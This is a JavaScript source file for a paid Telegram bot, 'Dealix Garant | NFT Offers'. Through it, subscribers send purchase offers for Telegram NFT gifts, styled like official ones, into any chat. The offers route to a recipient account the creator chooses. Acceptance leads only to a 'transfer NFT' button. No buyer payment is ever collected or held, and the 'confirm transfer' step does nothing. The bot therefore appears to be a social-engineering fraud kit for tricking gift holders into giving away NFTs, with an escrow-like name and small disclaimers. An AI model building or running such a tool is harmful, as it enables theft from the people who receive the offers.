
import { InlineKeyboard } from "grammy";
import { randomBytes } from "node:crypto";
import fs from "node:fs";
import path from "node:path";

const BOT_USERNAME = "DealixGarant_Bot";
const ADMIN_ID = 8855596552;
const ACCESS_PRICE = 100;
const OFFER_LIFETIME = 6 * 60 * 60 * 1000;

const DATA_FILE = path.join(
  process.env.DATA_DIR || process.cwd(),
  "dealix-data.json"
);

function loadData() {
  try {
    return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
  } catch (error) {
    if (error.code !== "ENOENT") throw error;
    return {};
  }
}

const db = loadData();
db.users ??= {};
db.offers ??= {};
db.payments ??= {};
db.invoices ??= {};

function save() {
  fs.mkdirSync(path.dirname(DATA_FILE), {
    recursive: true
  });

  const tmp = DATA_FILE + ".tmp";
  fs.writeFileSync(tmp, JSON.stringify(db, null, 2));
  fs.renameSync(tmp, DATA_FILE);
}

function makeId() {
  return randomBytes(8).toString("hex");
}

function isAdmin(id) {
  return String(id) === String(ADMIN_ID);
}

function account(id) {
  const key = String(id);

  db.users[key] ??= {
    paid: false,
    recipient: "",
    grantType: null
  };

  return db.users[key];
}

function hasAccess(id) {
  return isAdmin(id) || account(id).paid === true;
}

function validUsername(value) {
  return /^@[A-Za-z][A-Za-z0-9_]{4,31}$/.test(value);
}

function parseOffer(text) {
  const match = String(text || "").trim().match(
    /^(?:offer\s+)?(?:https?:\/\/)?(?:www\.)?(?:t\.me|telegram\.me)\/nft\/([A-Za-z0-9_-]+)-(\d+)\/?\s+(\d+)(?:\s+(@[A-Za-z0-9_]+))?$/i
  );

  if (!match) return null;

  const price = Number(match[3]);

  if (
    !Number.isSafeInteger(price) ||
    price < 1 ||
    price > 100000000
  ) return null;

  if (match[4] && !validUsername(match[4])) {
    return null;
  }

  const slug = match[1];
  const number = match[2];

  return {
    gift: slug
      .replace(/([a-z])([A-Z])/g, "$1 $2") +
      ` #${number}`,
    compactGift: `${slug}#${number}`,
    url: `https://t.me/nft/${slug}-${number}`,
    price,
    recipientOverride: match[4] || null
  };
}

function createOffer(data, from) {
  const recipient =
    data.recipientOverride ||
    account(from.id).recipient;

  if (!recipient) return null;

  const key = makeId();

  db.offers[key] = {
    ...data,
    recipient,
    creatorId: from.id,
    buyer: from.first_name || "Пользователь",
    status: "active",
    acceptedBy: null,
    createdAt: Date.now(),
    expiresAt: Date.now() + OFFER_LIFETIME
  };

  save();
  return key;
}

function preview(url) {
  return {
    is_disabled: false,
    url,
    prefer_large_media: true,
    show_above_text: true
  };
}

function remainingTime(o) {
  const minutes = Math.ceil(
    Math.max(0, o.expiresAt - Date.now()) / 60000
  );

  return (
    `${Math.floor(minutes / 60)} ч. ` +
    `${minutes % 60} мин.`
  );
}

function offerText(o) {
  return (
    `${o.url}\n\n` +
    `Пользователь ${o.buyer} предлагает ` +
    `Вам ${o.price} ⭐ за коллекционный ` +
    `предмет ${o.compactGift}.\n\n` +
    `Предложение действует ещё ${remainingTime(o)}\n\n` +
    `Оплата NFT не подтверждена.`
  );
}

function acceptedText(o) {
  return (
    `${o.url}\n\n` +
    `🎁 Коллекционный предмет: ${o.compactGift}\n\n` +
    `✅ Предложение о покупке принято.\n\n` +
    `Покупатель предлагает ${o.price} ⭐ ` +
    `за NFT-подарок.\n\n` +
    `Получатель: ${o.recipient}\n\n` +
    `Оплата и передача подарка ожидают подтверждения.\n\n` +
    `Не передавайте NFT до подтверждения ` +
    `безопасного способа оплаты.`
  );
}

function offerButtons(key) {
  return new InlineKeyboard()
    .text("Отклонить", `reject:${key}`)
    .text("Принять", `accept:${key}`);
}

function acceptedButtons(key) {
  const o = db.offers[key];

  return new InlineKeyboard()
    .url("Передать NFT", o.url)
    .row()
    .text("Подтвердить передачу", `sent:${key}`);
}

function alert(ctx, message) {
  return ctx.answerCallbackQuery({
    text: message,
    show_alert: true
  });
}

function adminKeyboard() {
  return new InlineKeyboard()
    .text("🎁 Выдать доступ", "admin_grant")
    .row()
    .text("🚫 Отозвать доступ", "admin_revoke")
    .row()
    .text("📊 Статистика", "admin_stats");
}

export function registerCommands(bot) {

  // START
  bot.command("start", async ctx => {
    const user = account(ctx.from.id);

    if (!hasAccess(ctx.from.id)) {
      return ctx.reply(
        "🎁 Dealix Garant | NFT Offers\n\n" +
        "Создавайте предложения о покупке " +
        "коллекционных подарков Telegram.\n\n" +
        "⭐ Стоимость: 100 Stars\n" +
        "♾ Доступ: бессрочный\n" +
        "💳 Оплата: один раз\n\n" +
        "Для покупки используйте /buy.\n\n" +
        "Предложения не подтверждают оплату NFT.",
        {
          reply_markup: new InlineKeyboard()
            .text("⭐ Купить за 100 Stars", "buy_access")
        }
      );
    }

    await ctx.reply(
      "🎁 Dealix Garant | NFT Offers\n\n" +
      "✅ Постоянный доступ активен.\n\n" +
      `Получатель: ${user.recipient || "не указан"}\n\n` +
      "Установить получателя:\n" +
      "/recipient @Mazviro\n\n" +
      "Создать предложение:\n" +
      "/offer t.me/nft/SkyStilettos-41219 4999\n\n" +
      "Inline Mode:\n" +
      `@${BOT_USERNAME} offer ` +
      "t.me/nft/SkyStilettos-41219 4999\n\n" +
      (isAdmin(ctx.from.id)
        ? "🛡 Админ-панель: /admin"
        : "")
    );
  });

  // PAYMENT
  async function sendInvoice(ctx) {
    if (ctx.chat?.type !== "private") {
      return ctx.reply(
        "Оплата доступна в личном чате с ботом."
      );
    }

    if (hasAccess(ctx.from.id)) {
      return ctx.reply(
        "✅ Доступ уже активирован."
      );
    }

    const payload =
      `access:${ctx.from.id}:${makeId()}`;

    db.invoices[payload] = {
      userId: ctx.from.id,
      amount: ACCESS_PRICE
    };
    save();

    await ctx.api.sendInvoice(
      ctx.chat.id,
      "NFT Offers — постоянный доступ",
      "Постоянный доступ к /offer и Inline Mode.",
      payload,
      "XTR",
      [{ label: "Постоянный доступ", amount: 100 }],
      { provider_token: "" }
    );
  }

  bot.command("buy", sendInvoice);

  bot.callbackQuery("buy_access", async ctx => {
    await ctx.answerCallbackQuery();
    await sendInvoice(ctx);
  });

  bot.on("pre_checkout_query", async ctx => {
    const q = ctx.preCheckoutQuery;
    const invoice = db.invoices[q.invoice_payload];

    if (
      !invoice ||
      invoice.userId !== q.from.id ||
      q.currency !== "XTR" ||
      q.total_amount !== ACCESS_PRICE
    ) {
      return ctx.answerPreCheckoutQuery(false, {
        error_message:
          "Некорректный счёт. Создайте новый через /buy."
      });
    }

    await ctx.answerPreCheckoutQuery(true);
  });

  bot.on("message:successful_payment", async ctx => {
    const payment = ctx.message.successful_payment;
    const invoice = db.invoices[payment.invoice_payload];

    if (
      !invoice ||
      invoice.userId !== ctx.from.id ||
      payment.currency !== "XTR" ||
      payment.total_amount !== ACCESS_PRICE
    ) return;

    const chargeId =
      payment.telegram_payment_charge_id;

    if (!db.payments[chargeId]) {
      db.payments[chargeId] = {
        userId: ctx.from.id,
        amount: ACCESS_PRICE,
        date: Date.now()
      };

      account(ctx.from.id).paid = true;
      account(ctx.from.id).grantType = "payment";

      delete db.invoices[payment.invoice_payload];
      save();
    }

    await ctx.reply(
      "✅ Оплата успешно получена!\n\n" +
      "Доступ активирован бессрочно.\n\n" +
      "Установите получателя:\n" +
      "/recipient @username"
    );
  });

  // RECIPIENT
  bot.command("recipient", async ctx => {
    if (!hasAccess(ctx.from.id)) {
      return ctx.reply(
        "🔒 Для использования купите доступ: /buy"
      );
    }

    const recipient = String(ctx.match || "").trim();

    if (!validUsername(recipient)) {
      return ctx.reply(
        "Формат: /recipient @username"
      );
    }

    account(ctx.from.id).recipient = recipient;
    save();

    await ctx.reply(
      `✅ Получатель установлен: ${recipient}`
    );
  });

  // STATUS
  bot.command("status", async ctx => {
    const user = account(ctx.from.id);

    await ctx.reply(
      "👤 Статус аккаунта\n\n" +
      `Доступ: ${hasAccess(ctx.from.id)
        ? "Активен"
        : "Не оплачен"}\n` +
      `Получатель: ${user.recipient || "не указан"}`
    );
  });

  // ADMIN PANEL
  bot.command("admin", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return ctx.reply("❌ Доступ запрещён.");
    }

    await ctx.reply(
      "🛡 Dealix Garant | Админ-панель\n\n" +
      `Администратор: ${ADMIN_ID}\n` +
      "Ваш доступ: бесплатный, бессрочный.\n\n" +
      "Выберите действие:",
      { reply_markup: adminKeyboard() }
    );
  });

  bot.callbackQuery("admin_grant", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return alert(ctx, "Доступ запрещён.");
    }

    await ctx.answerCallbackQuery();
    await ctx.reply(
      "🎁 Выдача доступа\n\n" +
      "Введите:\n/grant TELEGRAM_ID\n\n" +
      "Пример:\n/grant 123456789"
    );
  });

  bot.command("grant", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return ctx.reply("❌ Доступ запрещён.");
    }

    const id = String(ctx.match || "").trim();

    if (!/^\d{1,20}$/.test(id)) {
      return ctx.reply(
        "Формат: /grant TELEGRAM_ID"
      );
    }

    account(id).paid = true;
    account(id).grantType = "admin";
    save();

    await ctx.reply(
      "✅ Постоянный доступ выдан.\n\n" +
      `Telegram ID: ${id}\n` +
      "Стоимость: бесплатно\n" +
      "Срок: бессрочно"
    );
  });

  bot.callbackQuery("admin_revoke", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return alert(ctx, "Доступ запрещён.");
    }

    await ctx.answerCallbackQuery();
    await ctx.reply(
      "🚫 Отзыв доступа\n\n" +
      "Введите:\n/revoke TELEGRAM_ID"
    );
  });

  bot.command("revoke", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return ctx.reply("❌ Доступ запрещён.");
    }

    const id = String(ctx.match || "").trim();

    if (!/^\d{1,20}$/.test(id)) {
      return ctx.reply(
        "Формат: /revoke TELEGRAM_ID"
      );
    }

    if (isAdmin(id)) {
      return ctx.reply(
        "❌ Нельзя отозвать доступ администратора."
      );
    }

    account(id).paid = false;
    account(id).grantType = null;
    save();

    await ctx.reply(
      `🚫 Доступ пользователя ${id} отозван.`
    );
  });

  async function sendStats(ctx) {
    const users = Object.keys(db.users).length;

    const paid = Object.values(db.users)
      .filter(u => u.grantType === "payment").length;

    const free = Object.values(db.users)
      .filter(u => u.grantType === "admin").length;

    const offers = Object.keys(db.offers).length;
    const payments = Object.keys(db.payments).length;

    await ctx.reply(
      "📊 Статистика Dealix Garant\n\n" +
      `👥 Пользователей: ${users}\n` +
      `⭐ Купили доступ: ${paid}\n` +
      `🎁 Бесплатный доступ: ${free}\n` +
      `📦 Создано предложений: ${offers}\n` +
      `💳 Успешных оплат: ${payments}\n` +
      `💰 Получено: ${payments * ACCESS_PRICE} ⭐`
    );
  }

  bot.callbackQuery("admin_stats", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return alert(ctx, "Доступ запрещён.");
    }

    await ctx.answerCallbackQuery();
    await sendStats(ctx);
  });

  bot.command("stats", async ctx => {
    if (!isAdmin(ctx.from.id)) {
      return ctx.reply("❌ Доступ запрещён.");
    }

    await sendStats(ctx);
  });

  // OFFER
  bot.command("offer", async ctx => {
    if (ctx.chat.type !== "private") {
      return ctx.reply(
        "Используйте /offer в личном чате с ботом."
      );
    }

    if (!hasAccess(ctx.from.id)) {
      return ctx.reply(
        "🔒 Постоянный доступ стоит 100 ⭐.\n" +
        "Для оплаты: /buy"
      );
    }

    const data = parseOffer(ctx.match || "");

    if (!data) {
      return ctx.reply(
        "Формат:\n" +
        "/offer t.me/nft/SkyStilettos-41219 4999"
      );
    }

    const key = createOffer(data, ctx.from);

    if (!key) {
      return ctx.reply(
        "Сначала установите получателя:\n" +
        "/recipient @username"
      );
    }

    const o = db.offers[key];

    await ctx.reply(offerText(o), {
      reply_markup: offerButtons(key),
      link_preview_options: preview(o.url)
    });
  });

  // INLINE MODE
  bot.inlineQuery(/.*/, async ctx => {
    if (!hasAccess(ctx.from.id)) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true,
        button: {
          text: "Купить доступ за 100 ⭐",
          start_parameter: "access"
        }
      });
    }

    const data = parseOffer(ctx.inlineQuery.query);

    if (!data) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true
      });
    }

    const key = createOffer(data, ctx.from);

    if (!key) {
      return ctx.answerInlineQuery([], {
        cache_time: 0,
        is_personal: true,
        button: {
          text: "Указать получателя NFT",
          start_parameter: "recipient"
        }
      });
    }

    const o = db.offers[key];

    await ctx.answerInlineQuery([{
      type: "article",
      id: key,
      title: `${o.gift} — ${o.price} ⭐`,
      description: "Отправить NFT-предложение",
      input_message_content: {
        message_text: offerText(o),
        link_preview_options: preview(o.url)
      },
      reply_markup: {
        inline_keyboard: [[
          {
            text: "Отклонить",
            callback_data: `reject:${key}`
          },
          {
            text: "Принять",
            callback_data: `accept:${key}`
          }
        ]]
      }
    }], {
      cache_time: 0,
      is_personal: true
    });
  });

  // ACCEPT
  bot.callbackQuery(/^accept:([a-f0-9]+)$/, async ctx => {
    const key = ctx.match[1];
    const o = db.offers[key];

    if (!o || o.status !== "active") {
      return alert(ctx, "Предложение недоступно.");
    }

    if (Date.now() >= o.expiresAt) {
      o.status = "expired";
      save();
      return alert(
        ctx,
        "Срок действия предложения истёк."
      );
    }

    if (ctx.from.id === o.creatorId) {
      return alert(
        ctx,
        "Нельзя принять собственное предложение."
      );
    }

    o.status = "accepted";
    o.acceptedBy = ctx.from.id;
    save();

    await alert(
      ctx,
      "✅ Предложение принято.\n" +
      "Оплата NFT не подтверждена."
    );

    try {
      await ctx.editMessageText(acceptedText(o), {
        reply_markup: acceptedButtons(key),
        link_preview_options: preview(o.url)
      });
    } catch (error) {
      console.error("Edit accepted offer:", error);
    }
  });

  // REJECT
  bot.callbackQuery(/^reject:([a-f0-9]+)$/, async ctx => {
    const o = db.offers[ctx.match[1]];

    if (!o || o.status !== "active") {
      return alert(ctx, "Предложение недоступно.");
    }

    if (ctx.from.id === o.creatorId) {
      return alert(
        ctx,
        "Нельзя отклонить собственное предложение."
      );
    }

    o.status = "rejected";
    save();

    await alert(ctx, "Предложение отклонено.");

    try {
      await ctx.editMessageReplyMarkup({
        reply_markup: new InlineKeyboard()
      });
    } catch (error) {
      console.error(error);
    }
  });

  // CONFIRM TRANSFER
  bot.callbackQuery(/^sent:([a-f0-9]+)$/, async ctx => {
    const o = db.offers[ctx.match[1]];

    if (
      !o ||
      o.status !== "accepted" ||
      o.acceptedBy !== ctx.from.id
    ) {
      return alert(ctx, "Предложение недоступно.");
    }

    await alert(
      ctx,
      "❌ Передача подарка не подтверждена."
    );
  });
}




